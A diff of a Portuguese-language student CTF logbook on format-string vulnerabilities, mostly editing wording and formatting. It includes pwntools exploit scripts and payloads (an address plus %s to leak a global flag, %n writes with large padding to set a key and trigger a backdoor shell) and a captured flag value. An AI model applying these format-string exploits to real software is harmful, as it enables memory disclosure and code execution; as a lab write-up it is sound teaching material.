@@ -206,48 +206,50 @@ with open('badfile', 'wb') as f:
 * a *stack* não tem permissões de execução
 * as posições do binário em memória não são aleatorizadas
 
-* Com estas proteções, concluímos que não é possível realizar um ataque *buffer overflow* (porque a *stack* tem canário e não tem permissões de execução), mas é possível realizar um ataque do tipo *format string* porque as posições do binário em memória não são aleatorizadas, o que permite usar o *gdb* para analisar o programa e chegar aos endereços que precisamos
+* Com estas proteções, concluímos que não é possível realizar um ataque de *buffer overflow* (porque a *stack* tem canário e não tem permissões de execução), mas é possível realizar um ataque do tipo *format string*, porque as posições do binário em memória não são aleatorizadas, o que permite usar o *gdb* para analisar o programa e chegar aos endereços que precisamos
 
-* Ao analisarmos o código-fonte do *main.c* disponibilizado, verificamos que era pedido um input ao utilizador e que era impresso pela função `printf` sem ser sanitizado, o que é uma vulnerabilidade de *format string*
+* Ao analisarmos o código-fonte do ficheiro `main.c` disponibilizado, verificamos que era pedido um *input* ao utilizador e que este era impresso pela função `printf` sem ser sanitizado, o que é uma vulnerabilidade de *format string*
 
 ```c	
-  scanf("%32s", &buffer);
-  printf("You gave me this: ");
-  printf(buffer);
+scanf("%32s", &buffer);
+printf("You gave me this: ");
+printf(buffer);
 ```
 
-* Observamos também que a *flag* fica guardada como variável global do programa, o que significa que podemos aceder ao seu conteúdo se conseguirmos ler da *stack* e encontrar o seu endereço
+* Observamos também que a *flag* fica guardada como variável global do programa, o que significa que podemos aceder ao seu conteúdo se conseguirmos encontrar o seu endereço de memória e ler o que está presente nesse endereço
 
 ```c
-  char flag[FLAG_BUFFER_SIZE];
+char flag[FLAG_BUFFER_SIZE];
 ```
 
-* Esta vulnerabilidade permite escrever diretamente na *string de formatação* e assim, ler o conteúdo apontado por um endereço de memória presente na *stack*
+* A vulnerabilidade encontrada permite escrever diretamente na *string* de formatação e, assim, ler o conteúdo apontado por um endereço de memória presente na *stack*
 
-* As funcionalidades que nos permitem obter a flag são o especificador `%s`, que permite ler uma *string* de memória e imprimi-la, bem como o *gdb* que nos permite obter esse endereço de memória
+* As funcionalidades que nos permitem obter a *flag* são o especificador `%s`, que permite ler uma *string* de memória e imprimi-la, bem como o *gdb*, que nos permite obter esse endereço de memória
 
-```c
-  gdb program
-  p &flag
 ```
+gdb program
+p &flag
+```
+
 ![Endereço](/images/logbook7-endereco-desafio1.png)
 
-* Modificamos o exploit_example.py para escrever o endereço da *flag* em formato string e em little endian e para conter o especificador `%s` no final da *string de formatação*, de maneira a ler do endereço pretendido
+* Modificamos o ficheiro `exploit_example.py` para escrever o endereço da *flag* em *string* e em *little endian*, contendo o especificador `%s` no final da *string* de formatação, de maneira a ler do endereço pretendido
 
 ```python
-  #!/usr/bin/python3
+#!/usr/bin/python3
 
-  from pwn import *
+from pwn import *
 
-  p = remote("ctf-fsi.fe.up.pt", 4004)
+p = remote("ctf-fsi.fe.up.pt", 4004)
 
-  p.recvuntil(b"got:")
-  p.sendline(b"\x60\xC0\x04\x08%s")
-  p.interactive()
-```	
-* Assim obtivemos a *flag* `flag{803fe3f7ffea58b470eaaea84fd763c7}`
+p.recvuntil(b"got:")
+p.sendline(b"\x60\xC0\x04\x08%s")
+p.interactive()
+```
 
-![Endereço](/images/logbook7-flag-desafio1.png)
+* Assim, obtivemos a *flag* `flag{803fe3f7ffea58b470eaaea84fd763c7}`
+
+![Flag](/images/logbook7-flag-desafio1.png)
 
 ## Desafio 2
 
@@ -267,7 +269,7 @@ with open('badfile', 'wb') as f:
 * a *stack* não tem permissões de execução
 * as posições do binário em memória não são aleatorizadas
 
-* Tendo em conta que as proteções são as mesmas do que o ficheiro `program` anterior, concluímos que também podemos realizar um ataque do tipo *format string*
+* Tendo em conta que as proteções são as mesmas que as do ficheiro `program` anterior, concluímos que também podemos realizar um ataque do tipo *format string*
 
 * O código do ficheiro `main.c` é semelhante ao anterior, pelo que a vulnerabilidade se encontra na linha abaixo, devido à não sanitização do *input* do utilizador
 
@@ -277,24 +279,25 @@ fflush(stdout);
 scanf("%32s", &buffer);
 ```
 
-* A vulnerabilidade identificada permite escrever diretamente na *string de formatação* e assim, escrever num endereço de memória presente na *stack*
+* A vulnerabilidade identificada permite escrever diretamente na *string* de formatação e, assim, escrever num endereço de memória presente na *stack*
 
 * Observamos também que `key` é uma variável global do programa e que, se esta tiver o valor `0xbeef`, é aberta uma *shell*, que nos permite ler o ficheiro `flag.txt` e, assim, aceder à *flag*
 
 ```c
-if(key == 0xbeef) {
+if (key == 0xbeef) {
     printf("Backdoor activated\n");
     fflush(stdout);
     system("/bin/bash");    
 }
 ```
 
-* As funcionalidades que nos permitem obter a flag são o especificador `%n`, que permite escrever num endereço de memória, bem como o *gdb* que nos permite obter esse endereço de memória
+* As funcionalidades que nos permitem obter a *flag* são o especificador `%n`, que permite escrever num endereço de memória, bem como o *gdb*, que nos permite obter esse endereço de memória
 
-```c
+```
 gdb program
 p &key
 ```
+
 ![Endereço](/images/logbook7-endereco-desafio2.png)
 
 * Como o número `0xbeef` em hexadecimal corresponde a **48879** em decimal, é necessário imprimir 48879 caracteres antes do especificador `%n`
@@ -305,7 +308,7 @@ p &key
 
 * Finalmente, utilizamos `%1$n` para obrigar o especificador `%n` a escrever no endereço de memória pretendido, que se encontra no topo da *stack*
 
-* Modificamos o `exploit_example.py` para escrever o endereço pretendido em formato string e em *little endian*, seguido de `%.48875x` e de `%1$n`, de maneira a cumprir o pretendido
+* Modificamos o ficheiro `exploit_example.py` para escrever o endereço pretendido em *string* e em *little endian*, seguido de `%.48875x` e de `%1$n`, de maneira a cumprir o pretendido
 
 ```python
 #!/usr/bin/python3
@@ -337,7 +340,7 @@ p.interactive()
 
 * O problema deste desafio reside no byte `0x20` do endereço de memória da variável `key`, que, de acordo com a Tabela ASCII, é interpretado como um caracter de espaço e, por isso, dificulta a escrita no endereço pretendido
 
-* A solução encontrada foi escrever no endereço de memória imediatamente anterior (`0x0804b31f`) o valor `0xbeef00`, de maneira a escrever `0xbeef`por cima do endereço correto da variável `key`
+* A solução encontrada foi escrever no endereço de memória imediatamente anterior (`0x0804b31f`) o valor `0xbeef00`, de maneira a escrever `0xbeef` por cima do endereço correto da variável `key`
 
 * Como o número `0xbeef00` em hexadecimal corresponde a **12513024** em decimal, é necessário imprimir 12513024 caracteres antes de um especificador `%n`
 
@@ -347,7 +350,7 @@ p.interactive()
 
 * Finalmente, utilizamos `%1$n` para obrigar o especificador `%n` a escrever no endereço de memória pretendido, que se encontra no topo da *stack*
 
-* Modificamos o `exploit_example.py` para escrever o endereço pretendido em formato string e em *little endian*, seguido de `%.12513020x` e de `%1$n`, de maneira a cumprir o pretendido
+* Modificamos o ficheiro `exploit_example.py` para escrever o endereço pretendido em *string* e em *little endian*, seguido de `%.12513020x` e de `%1$n`, de maneira a cumprir o pretendido
 
 ```python
 #!/usr/bin/python3
